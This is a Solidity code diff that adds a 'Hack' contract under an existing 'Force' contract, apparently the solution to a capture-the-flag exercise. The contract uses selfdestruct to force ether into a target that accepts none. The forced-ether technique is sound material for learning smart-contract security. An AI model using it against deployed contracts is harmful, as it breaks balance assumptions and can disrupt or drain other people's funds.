@@ -12,3 +12,17 @@ contract Force {
 
 */
 }
+
+contract Hack {
+    Force force;
+
+    constructor(address payable _force) {
+        force = Force(_force);
+    }
+
+    function sendEther() public payable {
+        selfdestruct(payable(address(force)));
+    }
+
+    receive() external payable {}
+}
